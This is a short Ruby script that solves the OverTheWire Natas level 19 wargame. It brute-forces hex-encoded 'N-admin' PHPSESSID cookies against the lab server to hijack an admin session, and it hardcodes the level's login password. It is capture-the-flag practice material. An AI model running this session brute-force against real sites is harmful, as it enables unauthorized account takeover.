#!/usr/bin/env ruby

require 'rubygems'
require 'bundler/setup'
Bundler.require(:default)

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = { user: "natas19", password: "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" }
non_admin = "Login as an admin to retrieve credentials for natas20."
for i in 0..640
  php_sess_id = "#{i}-admin"
  php_sess_id_hex = php_sess_id.to_hex_string(false)
  puts i
  puts php_sess_id
  puts php_sess_id_hex
  response = Unirest.post url, auth: auth,
               headers: { "Cookie" => "PHPSESSID=#{php_sess_id_hex}" }
  unless response.body.include? non_admin
    puts response.body
    break
  end
end